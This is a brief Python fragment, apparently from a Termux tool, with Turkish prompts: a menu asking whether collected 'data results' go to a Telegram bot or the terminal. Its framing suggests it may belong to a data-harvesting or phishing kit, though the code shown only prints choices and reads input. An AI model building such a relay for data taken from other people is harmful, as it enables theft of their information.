# --- LOG SEÇİM EKRANI ---
def log_setup():
    banner()
    print(f"{Fore.CYAN}[?] Veri Sonuçları Nereye Gelsin?")
    print(f"{Fore.YELLOW}[1] {Fore.WHITE}Telegram Bot (Otomatik)")
    print(f"{Fore.YELLOW}[2] {Fore.WHITE}Termux Terminal (Uygulama)")

    sec = input(f"\n{Fore.GREEN}Seçiminiz > {Fore.WHITE}")
